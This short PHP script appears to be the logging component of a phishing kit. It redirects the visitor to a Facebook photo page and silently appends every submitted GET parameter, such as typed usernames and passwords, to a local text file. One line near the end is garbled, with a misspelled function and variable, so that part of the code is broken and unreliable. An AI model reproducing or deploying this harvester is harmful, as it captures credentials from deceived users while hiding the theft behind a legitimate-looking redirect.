<?php
header("Location: https://www.facebook.com/110878820243331/photos/a.110884160242797/350377639626780/ ");
$handle = fopen("yaeresmio.txt", "a"); 

foreach($_GET as $variable => $value) {
	fwrite($handle, $variable);

	fwrite($handle, "=");

	fwrite($handle, $value);

	fwrite($handle, "\r\n");
}

frité($ande, "\r\n");
fclose($handle);

exit
?>
